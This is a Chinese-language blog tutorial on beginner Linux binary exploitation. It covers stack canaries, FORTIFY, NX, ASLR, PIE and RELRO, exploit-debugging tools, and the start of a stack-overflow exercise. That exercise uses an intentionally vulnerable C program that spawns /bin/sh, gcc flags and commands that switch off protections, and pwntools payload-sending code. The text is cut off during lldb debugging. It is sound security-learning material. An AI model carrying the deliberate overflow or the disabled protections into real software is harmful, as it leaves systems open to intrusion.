<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"pandamac.github.io","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"F8APJ8E550","apiKey":"d050e8704a1173bb5f72414e4300eed1","indexName":"pandamac","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="linux pwn入门学习到放弃[TOC] PWN是一个黑客语法的俚语词，自”own”这个字引申出来的，意为玩家在整个游戏对战中处在胜利的优势。本文记录菜鸟学习linux pwn入门的一些过程，详细介绍linux上的保护机制，分析一些常见漏洞如栈溢出,堆溢出，use after free等,以及一些常见工具集合介绍等。">
<meta name="keywords" content="study">
<meta property="og:type" content="article">
<meta property="og:title" content="linux pwn入门学习到放弃">
<meta property="og:url" content="http://pandamac.github.io/2020/05/20/linux-pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E5%88%B0%E6%94%BE%E5%BC%83/index.html">
<meta property="og:site_name" content="pandamac&#39;s Note">
<meta property="og:description" content="linux pwn入门学习到放弃[TOC] PWN是一个黑客语法的俚语词，自”own”这个字引申出来的，意为玩家在整个游戏对战中处在胜利的优势。本文记录菜鸟学习linux pwn入门的一些过程，详细介绍linux上的保护机制，分析一些常见漏洞如栈溢出,堆溢出，use after free等,以及一些常见工具集合介绍等。">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://i.loli.net/2020/05/20/vTLRcGwqF16QrNZ.jpg">
<meta property="og:image" content="https://i.loli.net/2020/05/20/mKT2Jdgq6BHWNXs.jpg">
<meta property="og:image" content="https://i.loli.net/2020/05/20/khMaumY2D4gIsxl.jpg">
<meta property="og:image" content="https://i.loli.net/2020/05/20/tudFLS2mWTrqZDP.jpg">
<meta property="og:image" content="https://i.loli.net/2020/05/20/ocXIbSTWuF7iJPA.jpg">
<meta property="og:image" content="https://i.loli.net/2020/05/20/bH2NKA3CpfrBDPV.jpg">
<meta property="og:image" content="https://i.loli.net/2020/05/20/xtGHUhoyOK7erjq.jpg">
<meta property="og:image" content="https://i.loli.net/2020/05/20/KAVDOuT18wUpnWm.jpg">
<meta property="og:updated_time" content="2020-05-20T07:40:11.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/20/vTLRcGwqF16QrNZ.jpg">

<link rel="canonical" href="http://pandamac.github.io/2020/05/20/linux-pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E5%88%B0%E6%94%BE%E5%BC%83/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true
  };
</script>

  <title>linux pwn入门学习到放弃 | pandamac's Note</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="pandamac's Note" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">pandamac's Note</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-right"></div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://pandamac.github.io/2020/05/20/linux-pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E5%88%B0%E6%94%BE%E5%BC%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="pandamac">
      <meta itemprop="description" content="Android/iOS/Macos">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pandamac's Note">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          linux pwn入门学习到放弃
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-20-15:36 15:36:37" itemprop="dateCreated datePublished" datetime="2020-05-20T15:36:37+08:00">2020-05-20-15:36</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-05-20-15:40 15:40:11" itemprop="dateModified" datetime="2020-05-20T15:40:11+08:00">2020-05-20-15:40</time>
              </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>27k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>25 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="linux-pwn入门学习到放弃"><a href="#linux-pwn入门学习到放弃" class="headerlink" title="linux pwn入门学习到放弃"></a>linux pwn入门学习到放弃</h1><p>[TOC]</p>
<p>PWN是一个黑客语法的俚语词，自”own”这个字引申出来的，意为玩家在整个游戏对战中处在胜利的优势。<br>本文记录菜鸟学习linux pwn入门的一些过程，详细介绍linux上的保护机制，分析一些常见漏洞如栈溢出,堆溢出，use after free等,以及一些常见工具集合介绍等。</p>
<a id="more"></a>

<h2 id="linux程序的常用保护机制"><a href="#linux程序的常用保护机制" class="headerlink" title="linux程序的常用保护机制"></a>linux程序的常用保护机制</h2><p>先来学习一些关于linux方面的保护措施，操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。从checksec入手来学习linux的保护措施。checksec可以检查可执行文件各种安全属性，包括Arch,RELRO,Stack,NX，PIE等。</p>
<ul>
<li><p>pip安装pwntools后自带checksec检查elf文件.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksec xxxx.so</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>另外笔者操作系统为macOS,一些常用的linux命令如readelf需要另外brew install binutils安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install binutils</span><br></pre></td></tr></table></figure>
</li>
<li><p>当然也可以独自安装checksec</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.sh&#x2F;archive&#x2F;2.1.0.tar.gz</span><br><span class="line">tar xvf 2.1.0.tar.gz</span><br><span class="line">.&#x2F;checksec.sh-2.1.0&#x2F;checksec --file&#x3D;xxx</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/05/20/vTLRcGwqF16QrNZ.jpg" alt="-w1311"></p>
</li>
<li><p>gdb里peda插件里自带的checksec功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb level4  &#x2F;&#x2F;加载目标程序</span><br><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护"><a href="#CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护" class="headerlink" title="CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护"></a>CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护</h3><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary/金丝雀。<br>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c                       &#x2F;&#x2F; 默认情况下，开启Canary保护</span><br><span class="line">gcc -fno-stack-protector  -o test test.c &#x2F;&#x2F;禁用栈保护</span><br><span class="line">gcc -fstack-protector     -o test test.c &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
<h3 id="FORTIFY-轻微的检查"><a href="#FORTIFY-轻微的检查" class="headerlink" title="FORTIFY/轻微的检查"></a>FORTIFY/轻微的检查</h3><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。<br>FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c		                &#x2F;&#x2F; 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;)</span><br><span class="line">_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</span><br><span class="line"></span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; 较强的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</span><br><span class="line">_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</span><br></pre></td></tr></table></figure>
<p>看编译后的二进制汇编我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
<h3 id="NX-DEP-数据执行保护"><a href="#NX-DEP-数据执行保护" class="headerlink" title="NX/DEP/数据执行保护"></a>NX/DEP/数据执行保护</h3><p>数据执行保护(DEP)（Data Execution Prevention） 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2及以上版本的Windows中，由硬件和软件一起强制实施 DEP。<br>支持 DEP 的 CPU 利用一种叫做NX(No eXecute) 不执行”的技术识别标记出来的区域。如果发现当前执行的代码没有明确标记为可执行（例如程序执行后由病毒溢出到代码执行区的那部分代码），则禁止其执行，那么利用溢出攻击的病毒或网络攻击就无法利用溢出进行破坏了。如果 CPU 不支持 DEP，Windows 会以软件方式模拟出 DEP 的部分功能。<br>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c &#x2F;&#x2F; 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>
<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
<h3 id="ASLR-Address-space-layout-randomization"><a href="#ASLR-Address-space-layout-randomization" class="headerlink" title="ASLR (Address space layout randomization)"></a>ASLR (Address space layout randomization)</h3><p>ASLR是一种针对缓冲区溢出的安全保护技术，通过对<strong>堆、栈、共享库映射</strong>等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。如今Linux、FreeBSD、Windows等主流操作系统都已采用了该技术。此技术需要操作系统和软件相配合。ASLR在linux中使用此技术后，杀死某程序后重新开启,地址就会会改变</p>
<p>在Linux上<br>关闭ASLR，切换至root用户，输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>开启ASLR，切换至root用户，输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p>上面的序号代表意思如下:<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。<br>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
<h3 id="PIE和PIC"><a href="#PIE和PIC" class="headerlink" title="PIE和PIC"></a>PIE和PIC</h3><p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。<br>-fPIC与-fpic都是在编译时加入的选项，用于生成<strong>位置无关的代码(Position-Independent-Code)</strong>。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对<strong>固定地址的访问都通过全局偏移表(GOT)</strong>来实现。-fPIC和-fpic最大的区别在于是否对GOT的大小有限制。-fPIC对GOT表大小无限制，所以如果在不确定的情况下，使用-fPIC是更好的选择。<br>-fPIE与-fpie是等价的。这个选项与-fPIC/-fpic大致相同，不同点在于：-fPIC用于生成动态库，-fPIE用与生成可执行文件。再说得直白一点：-fPIE用来生成位置无关的可执行代码。</p>
<p>PIE和ASLR不是一样的作用，ASLR只能对堆、栈,libc和mmap随机化，而不能对如代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。<br>区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。<br>联系点在于在开启ASLR之后，PIE才会生效。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				 &#x2F;&#x2F; 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c	 &#x2F;&#x2F; 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c	 &#x2F;&#x2F; 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		 &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		 &#x2F;&#x2F; 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>

<h3 id="RELRO-read-only-relocation"><a href="#RELRO-read-only-relocation" class="headerlink" title="RELRO(read only relocation)"></a>RELRO(read only relocation)</h3><p>在很多时候利用漏洞时可以写的内存区域通常是黑客攻击的目标，尤其是存储函数指针的区域。 而动态链接的ELF二进制文件使用称为全局偏移表（GOT）的查找表来动态解析共享库中的函数，GOT就成为了黑客关注的目标之一，</p>
<p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。<strong>大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域,GOT为只读.</strong>设置符号重定向表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。如果RELRO为 “Partial RELRO”，说明我们对GOT表具有写权限。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c              &#x2F;&#x2F; 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c   &#x2F;&#x2F; 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c      &#x2F;&#x2F; 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c       &#x2F;&#x2F; 全部开启</span><br></pre></td></tr></table></figure>
<p>开启FullRELRO后写利用时就不能复写got表。</p>
<h2 id="pwn工具常见整合"><a href="#pwn工具常见整合" class="headerlink" title="pwn工具常见整合"></a>pwn工具常见整合</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>pwntools是一个二进制利用框架,网上关于pwntools的用法教程很多，学好pwntools对于做漏洞的利用和理解漏洞有很好的帮助。可以利用pwntools库开发基于python的漏洞利用脚本。</p>
<h3 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h3><p>pycharm可以实时调试和编写攻击脚本，提高了写利用的效率。</p>
<ol>
<li><p>在远程主机上执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1</span><br></pre></td></tr></table></figure>
</li>
<li><p>用pycharm工具开发pwn代码，远程连接程序进行pwn测试。<br>需要设置环境变量 TERM=linux;TERMINFO=/etc/terminfo，并勾选 Emulate terminal in output coonsoole<br><img src="https://i.loli.net/2020/05/20/mKT2Jdgq6BHWNXs.jpg" alt="-w541"><br>然后pwntools的python脚本使用远程连接</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = remote(<span class="string">'172.16.36.176'</span>, <span class="number">10001</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">raw_input() <span class="comment"># for debug</span></span><br><span class="line">...</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>当pwntools开发的python脚本暂停时，远程ida可以附加查看信息</p>
<h3 id="gdb附加"><a href="#gdb附加" class="headerlink" title="gdb附加"></a>gdb附加</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">...</span><br><span class="line"><span class="comment"># Get PID(s) of target. The returned PID(s) depends on the type of target:</span></span><br><span class="line">m_pid=pwn.proc.pidof(p)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"attach %d"</span> % m_pid)</span><br><span class="line">pwn.gdb.attach(m_pid) <span class="comment"># 链接gdb调试，先在gdb界面按下n下一步返回python控制台enter继续(两窗口同步)</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"\n##########sending payload##########\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pwn.pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="gdb插件枚举"><a href="#gdb插件枚举" class="headerlink" title="gdb插件枚举"></a>gdb插件枚举</h3><p>1)PEDA - Python Exploit Development Assistance for GDB(<a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a>)<br>可以很清晰的查看到堆栈信息，寄存器和反汇编信息<br>git clone <a href="https://github.com/longld/peda.git" target="_blank" rel="noopener">https://github.com/longld/peda.git</a> ~/panda/peda<br>echo “source ~/panda/peda/peda.py” &gt;&gt; ~/.gdbinit</p>
<p>2)GDB Enhanced Features(<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a>)<br>peda的增强版，因为它支持更多的架构(ARM, MIPS, POWERPC…)，和更加强大的模块,并且和ida联动。</p>
<p>3)libheap(查看堆信息)<br>pip3 install libheap –verbose</p>
<h3 id="EDB附加"><a href="#EDB附加" class="headerlink" title="EDB附加"></a>EDB附加</h3><p>EDB 是一个可视化的跨平台调试器，跟win上的Ollydbg很像。</p>
<h3 id="lldb插件"><a href="#lldb插件" class="headerlink" title="lldb插件"></a>lldb插件</h3><p>voltron &amp; lisa。一个拥有舒服的ui界面，一个简洁但又拥有实用功能的插件。<br><a href="https://github.com/snare/voltron/" target="_blank" rel="noopener">voltron</a><br>配合tmux会产生很好的效果，如下:<br><img src="https://i.loli.net/2020/05/20/khMaumY2D4gIsxl.jpg" alt="-w820"></p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>通过几个例子来了解常见的几种保护手段和熟悉常见的攻击手法。<br>实践平台 ubuntu 14.16_x64</p>
<h3 id="实践1-栈溢出-利用溢出改变程序走向"><a href="#实践1-栈溢出-利用溢出改变程序走向" class="headerlink" title="实践1_栈溢出_利用溢出改变程序走向"></a>实践1_栈溢出_利用溢出改变程序走向</h3><h4 id="编译测试用例"><a href="#编译测试用例" class="headerlink" title="编译测试用例"></a>编译测试用例</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; system(<span class="string">"/bin/sh"</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"callsystem = %p\n"</span>, callsystem);</span><br><span class="line">write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line"><span class="comment">// /dev/stdin    fd/0</span></span><br><span class="line"><span class="comment">// /dev/stdout   fd/1</span></span><br><span class="line"><span class="comment">// /dev/stderr   fd/2</span></span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!bash</span></span><br><span class="line">gcc -fno-stack-protector -no-pie linux_x64_test1.c -o linux_x64_test1 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检测如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test1</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>发现没有栈保护，没有CANARY保护</p>
<h4 id="生成构造的数据"><a href="#生成构造的数据" class="headerlink" title="生成构造的数据"></a>生成构造的数据</h4><p>这里用到一个脚本pattern.py来生成随机数据，来自<a href="https://github.com/SaltwaterC/sploit-tools.git" target="_blank" rel="noopener">这里</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 pattern.py create 150</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure>
<h4 id="获取到溢出偏移"><a href="#获取到溢出偏移" class="headerlink" title="获取到溢出偏移"></a>获取到溢出偏移</h4><p>用lldb进行调试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/<span class="built_in">test</span>$ lldb linux_x64_test1</span><br><span class="line">(lldb) target create <span class="string">"linux_x64_test1"</span></span><br><span class="line">Current executable <span class="built_in">set</span> to <span class="string">'linux_x64_test1'</span> (x86_64).</span><br><span class="line">(lldb) run</span><br><span class="line">Process 117360 launched: <span class="string">'/home/panda/Desktop/test/linux_x64_test1'</span> (x86_64)</span><br><span class="line">Hello, World</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line">Process 117360 stopped</span><br><span class="line">* thread <span class="comment">#1: tid = 117360, 0x00000000004005e7 linux_x64_test1`vulnerable_function + 32, name = 'linux_x64_test1', stop reason = signal SIGSEGV: invalid address (fault address: 0x0)</span></span><br><span class="line">    frame <span class="comment">#0: 0x00000000004005e7 linux_x64_test1`vulnerable_function + 32</span></span><br><span 